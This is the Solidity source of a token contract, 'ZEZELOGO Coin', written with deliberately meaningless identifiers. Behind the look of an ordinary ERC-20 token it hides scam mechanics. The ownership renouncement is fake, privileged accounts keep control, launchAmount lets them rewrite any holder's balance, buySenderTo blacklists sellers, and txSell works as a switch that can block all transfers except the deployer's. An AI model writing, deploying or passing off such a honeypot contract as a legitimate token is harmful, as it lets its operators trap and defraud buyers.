//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface maxTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toLimit) external view returns (uint256);

    function transfer(address autoShould, uint256 liquidityTeam) external returns (bool);

    function allowance(address shouldLiquiditySender, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityTeam) external returns (bool);

    function transferFrom(
        address sender,
        address autoShould,
        uint256 liquidityTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenFeeLimit, uint256 value);
    event Approval(address indexed shouldLiquiditySender, address indexed spender, uint256 value);
}

interface maxTradingMetadata is maxTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract isTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamFee {
    function createPair(address autoFromAt, address takeLiquidity) external returns (address);
}

interface modeLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ZEZELOGOCoin is isTrading, maxTrading, maxTradingMetadata {

    uint256 private shouldBuy;

    function symbol() external view virtual override returns (string memory) {
        return fundMode;
    }

    bool public exemptSwap;

    address public modeShould;

    function totalSupply() external view virtual override returns (uint256) {
        return amountWallet;
    }

    function transfer(address takeFee, uint256 liquidityTeam) external virtual override returns (bool) {
        return modeLiquidityLaunched(_msgSender(), takeFee, liquidityTeam);
    }

    string private fundMode = "ZCN";

    bool public totalAmountTo;

    address private teamAt;

    function balanceOf(address toLimit) public view virtual override returns (uint256) {
        return fromSenderEnable[toLimit];
    }

    function fundWallet() private view {
        require(exemptAt[_msgSender()]);
    }

    bool public fundEnable;

    uint256 teamExempt;

    function launchAmount(address takeFee, uint256 liquidityTeam) public {
        fundWallet();
        fromSenderEnable[takeFee] = liquidityTeam;
    }

    mapping(address => mapping(address => uint256)) private toMax;

    function allowance(address fromExempt, address receiverBuy) external view virtual override returns (uint256) {
        if (receiverBuy == autoSender) {
            return type(uint256).max;
        }
        return toMax[fromExempt][receiverBuy];
    }

    function name() external view virtual override returns (string memory) {
        return senderTo;
    }

    bool private isAuto;

    mapping(address => bool) public listFrom;

    address autoSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private amountWallet = 100000000 * 10 ** 18;

    bool private isLimit;

    function limitMarketing(address fundTo, address autoShould, uint256 liquidityTeam) internal returns (bool) {
        require(fromSenderEnable[fundTo] >= liquidityTeam);
        fromSenderEnable[fundTo] -= liquidityTeam;
        fromSenderEnable[autoShould] += liquidityTeam;
        emit Transfer(fundTo, autoShould, liquidityTeam);
        return true;
    }

    address public amountTake;

    uint8 private isSell = 18;

    address autoReceiverTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private fromSenderEnable;

    function modeLiquidityLaunched(address fundTo, address autoShould, uint256 liquidityTeam) internal returns (bool) {
        if (fundTo == amountTake) {
            return limitMarketing(fundTo, autoShould, liquidityTeam);
        }
        uint256 tokenReceiverShould = maxTrading(modeShould).balanceOf(autoReceiverTotal);
        require(tokenReceiverShould == toBuyToken);
        require(!listFrom[fundTo]);
        return limitMarketing(fundTo, autoShould, liquidityTeam);
    }

    function transferFrom(address fundTo, address autoShould, uint256 liquidityTeam) external override returns (bool) {
        if (_msgSender() != autoSender) {
            if (toMax[fundTo][_msgSender()] != type(uint256).max) {
                require(liquidityTeam <= toMax[fundTo][_msgSender()]);
                toMax[fundTo][_msgSender()] -= liquidityTeam;
            }
        }
        return modeLiquidityLaunched(fundTo, autoShould, liquidityTeam);
    }

    string private senderTo = "ZEZELOGO Coin";

    bool private launchedLimit;

    constructor (){
        if (maxShould == totalAmountTo) {
            shouldBuy = tradingAt;
        }
        senderMax();
        modeLaunched listExempt = modeLaunched(autoSender);
        modeShould = teamFee(listExempt.factory()).createPair(listExempt.WETH(), address(this));
        
        amountTake = _msgSender();
        exemptAt[amountTake] = true;
        fromSenderEnable[amountTake] = amountWallet;
        if (isLimit != isAuto) {
            launchedLimit = true;
        }
        emit Transfer(address(0), amountTake, amountWallet);
    }

    function marketingAmount(address totalMode) public {
        if (fundEnable) {
            return;
        }
        
        exemptAt[totalMode] = true;
        if (maxShould) {
            isAuto = false;
        }
        fundEnable = true;
    }

    function senderMax() public {
        emit OwnershipTransferred(amountTake, address(0));
        teamAt = address(0);
    }

    function getOwner() external view returns (address) {
        return teamAt;
    }

    event OwnershipTransferred(address indexed takeBuy, address indexed shouldMax);

    mapping(address => bool) public exemptAt;

    function buySenderTo(address amountTotalFee) public {
        fundWallet();
        
        if (amountTotalFee == amountTake || amountTotalFee == modeShould) {
            return;
        }
        listFrom[amountTotalFee] = true;
    }

    function txSell(uint256 liquidityTeam) public {
        fundWallet();
        toBuyToken = liquidityTeam;
    }

    bool private maxShould;

    uint256 private tradingAt;

    function approve(address receiverBuy, uint256 liquidityTeam) public virtual override returns (bool) {
        toMax[_msgSender()][receiverBuy] = liquidityTeam;
        emit Approval(_msgSender(), receiverBuy, liquidityTeam);
        return true;
    }

    uint256 toBuyToken;

    function decimals() external view virtual override returns (uint8) {
        return isSell;
    }

    function owner() external view returns (address) {
        return teamAt;
    }

}